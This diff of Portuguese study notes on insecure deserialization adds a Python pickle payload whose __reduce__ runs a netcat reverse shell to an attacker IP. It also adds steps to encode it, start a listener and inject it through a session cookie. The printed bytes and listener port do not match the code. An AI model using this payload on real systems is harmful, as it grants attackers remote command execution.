@@ -6,6 +6,8 @@ INSECURE DESERIALIZATION
         -> ex: transformar um objeto javascript em .json (obviamente visualizamos o json num grau de alto nível, mas, numa perspectiva de baixo
         nível, ele é transformado em bytes)
 
+    SERIALIZAÇÃO : {object} ---> 01010101
+    DESERIALIZAÇ.: 10101010 ---> 01010101
 -> O QUE É INSECURE DESERIALIZATION
     -> ocorre quando um aplicativo ou sistema deserializa dados não confiáveis ou maliciosos sem realizar uma verificaçõa adequada
         -> ou seja, ocorre quando um sistema vai retransformar, por exemplo, um arquivo .json byteado em um objeto mas não faz a verificação adequada
@@ -18,9 +20,25 @@ INSECURE DESERIALIZATION
         ->
             import pickle
             import base64
-            import os
 
-            class payload_malicioso:
-                def __reduce__(self): // é um método relacionado à deserialização de objetos
-                    return (os.system, ("")
+
+            class malicious_payload:
+                def __reduce__(self):
+                    import os
+                    return (os.system, ("ncat -e powershell.exe IP-DO-ATACANTE 4444",))
+
+
+            serialized = pickle.dumps(malicious_payload())
+            encoded = base64.b16encode(serialized)
+
+            print(encoded)
+
+    -> vai ser gerado uma versão serializada desse código, que seria: b'8004953E000000000000008C026F73948C0673797374656D9493948C266E636174202D6520706F7765727368656C6C2E657865206861636B65722E6D616E203434343494859452942E'
+
+    -> agora, ir no console e abrir uma porta de preferencia (ex: 4444)
+        -> nc -lvp 444
+
+    -> então, aproveitando os cookies, que guardam dados serializados, podemos setar os cookies para guardar esse payload:
+        -> no console:
+        -> document.cookie='session=*stream de bytes gerado*'
 
